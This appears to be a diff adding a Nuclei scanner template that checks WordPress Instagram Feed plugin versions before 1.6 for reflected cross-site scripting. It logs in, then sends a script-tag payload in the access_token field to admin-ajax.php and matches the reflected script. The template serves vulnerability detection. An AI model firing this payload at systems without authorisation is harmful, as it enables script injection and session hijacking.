@@ -1,0 +1,56 @@
+id: wp-instagram-feed-xss
+
+info:
+  name: Instagram Feed < 1.6 - Cross-Site Scripting
+  author: theamanrawat
+  severity: medium
+  description: |
+    The Instagram Feed WordPress plugin before 1.6 contains a reflected cross-site scripting (XSS) vulnerability due to improper sanitization of user-supplied input, allowing attackers to inject malicious scripts via crafted requests.
+  impact: |
+    Attackers with administrator privileges can execute malicious Javascript in the context of the site, potentially stealing cookies or hijacking user sessions.
+  remediation: |
+    Update to version 1.6 or later.
+  reference:
+    - https://dumpco.re/blog/xss-instagram-feed
+    - https://wordpress.org/plugins/instagram-feed
+  metadata:
+    verified: false
+    max-requests: 2
+    public-www: "/wp-content/plugins/instagram-feed/"
+  tags: wordpress,wp,instagram-feed,xss,authenticated
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 302
+          - contains(header, "wordpress_logged_in")
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        action=sbi_auto_save_tokens&access_token=<script>alert(document.domain)</script>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+          - 'contains_all(body, "<script>alert(document.domain)</script>")'
+        condition: and
+# digest: 4a0a00473045022100aee2c95f99b9acfc8b8a7707dbe9154630485ee74122eb30b7e701dc841faacc0220425408a56c5f23d1813ea83dbe5265ee4f861623d69aa3606a1c73d11a14bb2a:922c64590222798bb761d5b6d8e72950
